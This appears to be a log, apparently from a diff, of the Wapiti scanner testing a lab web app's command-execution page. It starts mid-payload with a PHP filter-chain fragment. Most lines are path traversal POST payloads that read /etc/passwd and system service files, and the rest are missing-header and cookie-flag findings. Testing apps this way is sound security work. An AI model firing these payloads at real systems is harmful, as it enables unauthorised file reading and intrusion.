2%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp
+2024-03-20 12:43:43.945 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 12:43:43.974 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 12:43:43.996 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 12:43:44.018 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 12:43:44.045 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 12:43:44.070 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 12:43:44.091 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 12:43:44.118 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 12:43:44.142 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 12:43:44.161 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 12:43:44.184 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 12:43:44.209 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 12:43:44.232 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 12:43:44.264 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 12:43:44.293 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 12:43:44.324 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 12:43:44.348 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 12:43:44.380 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 12:43:44.403 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 12:43:44.435 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 12:43:44.462 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 12:43:44.492 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 12:43:44.517 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 12:43:44.544 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 12:43:44.574 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=file%3A%2F%2F%2Fetc%2Fpasswd
+2024-03-20 12:43:44.604 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 12:43:44.631 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
+2024-03-20 12:43:44.654 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00
+2024-03-20 12:43:44.678 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices
+2024-03-20 12:43:44.703 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00
+2024-03-20 12:43:44.729 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 12:43:44.756 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 12:43:44.805 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
+2024-03-20 12:43:44.822 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/exec/ (1)
+2024-03-20 12:43:44.832 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
+2024-03-20 12:43:44.832 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
+2024-03-20 12:43:44.880 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
+2024-03-20 12:43:44.880 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
+2024-03-20 12:43:44.958 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
+2024-03-20 12:43:44.974 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/exec/ (1)
+2024-03-20 12:43:44.988 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
+2024-03-20 12:43:44.998 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/exec/ (1)
+2024-03-20 12:43:45.007 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit
+2024-03-20 12:43:45.059 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit
+2024-03-20 12:43:45.133 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
+2024-03-20 12:43:45.147 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/exec/ (1)
+2024-03-20 12:43:45.155 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
+2024-03-20 12:43:45.238 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
+2024-03-20 12:43:45.253 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/exec/ (1)
+2024-03-20 12:43:45.253 | BLUE     | wapitiCore.attack.mod_cookieflags:attack:55 - Checking cookie : PHPSESSID
+2024-03-20 12:43:45.254 | RED      | wapitiCore.attack.mod_cookieflags:attack:57 - HttpOnly flag is not set in the cookie : PHPSESSID
+2024-03-20 12:43:45.281 | RED      | wapitiCore.attack.mod_cookieflags:attack:66 - Secure flag is not set in the cookie : PHPSESSID
+2024-03-20 12:43:45.340 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
+2024-03-20 12:43:45.350 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/exec/ (1)
+2024-03-20 12:43:45.371 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit
+2024-03-20 12:43:45.389 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit
+2024-03-20 12:43:45.459 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
+2024-03-20 12:43:45.481 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//rce_low.json/
+2024-03-20 12:43:45.482 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//rce_low.json/web_03202024_1243.html with a browser to see this report.
